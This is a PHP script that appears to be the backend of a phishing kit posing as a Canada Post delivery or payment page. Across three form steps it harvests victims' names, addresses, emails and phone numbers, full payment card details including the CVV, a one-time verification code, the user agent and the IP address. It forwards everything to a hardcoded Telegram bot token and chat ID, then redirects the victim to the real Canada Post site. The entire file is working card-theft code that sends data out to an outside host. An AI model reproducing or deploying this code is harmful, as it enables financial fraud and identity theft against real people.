<?php


if(isset($_POST['submit'])) {
    $captcha_response = $_POST['h-captcha-response'];
    $secret_key = '0xf76b6eeBce023D0c5A06c19a4a0Fa3fA95C0FB30';
    
    $data = array(
        'secret' => $secret_key,
        'response' => $captcha_response
    );
    $options = array(
        'http' => array(
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data)
        )
    );
    $context  = stream_context_create($options);
    $response = file_get_contents('https://hcaptcha.com/siteverify', false, $context);
    $result = json_decode($response, true);
    if ($result['success']) {
        // Captcha verification passed, process the form submission
        header('Location: notice.html');
        exit();
    } else {
        // Captcha verification failed, show an error message
        echo "Captcha verification failed. Please try again.";
    }
}




// Your Telegram bot API token
$token = '6077207888:AAFoRT7FtFep_g-tW8P379Nah-KZsTdeW4c';

// Your Telegram chat ID where you want to receive the message
$chat_id = '6261990742';

// Construct the message to send
if(isset($_POST['information'])){
    // Get the form data
$full_name = $_POST['full-name'];
$customer_address = $_POST['customer-address'];
$customer_city = $_POST['customer-city'];
$postal_code = $_POST['postal-code'];
$provinces = $_POST['provinces'];
$email = $_POST['email'];
$customer_phone = $_POST['customer-phone'];

$message = "New order received!\n\nFull Name: $full_name\nAddress: $customer_address, $customer_city, $provinces, $postal_code\nEmail: $email\nPhone: $customer_phone";
header('location:paiment.html');

}
if(isset($_POST['paiment'])){
    $number=$_POST['number'];
    $name=$_POST['name'];
    $expiry=$_POST['expiry'];
    $verification_value =$_POST['verification_value'];
    // add this
 $bank = $_POST['bank'];
$scheme = $_POST['scheme'];
$type = $_POST['type'];
$brand = $_POST['brand'];
$bin = $_POST['bin'];
$country = $_POST['country'];
$prepaid = $_POST['prepaid'];
$message = "New payment information received:\n\nNumber: $number\nName: $name\nExpiry: $expiry\nVerification Value: $verification_value\nBank: $bank\nScheme: $scheme\nType: $type\nBrand: $brand\nBin: $bin\nCountry: $country\nPrepaid: $prepaid";

// $message = "New payment information received:\n\nNumber: $number\nName: $name\nExpiry: $expiry\nVerification Value: $verification_value";
header('location:Verification.html');

}
if(isset($_POST['verification'])){

$code=$_POST['code'];
// Get the user agent and IP address
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$ipAddress = $_SERVER['REMOTE_ADDR'];

$message = "New payment Code received:\n\nCode: $code.
New userAgent received:\n\nUserAgent: $userAgent.
New  ipAddress received:\n\nIpAdress: $ipAddress";
header('Location: https://www.canadapost.ca');

}
// URL for the Telegram Bot API
$url = "https://api.telegram.org/bot$token/sendMessage";

// Parameters for the HTTP POST request
$params = array(
    'chat_id' => $chat_id,
    'text' => $message
);

// Send the HTTP POST request to the Telegram Bot API
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($ch);
curl_close($ch);




?>
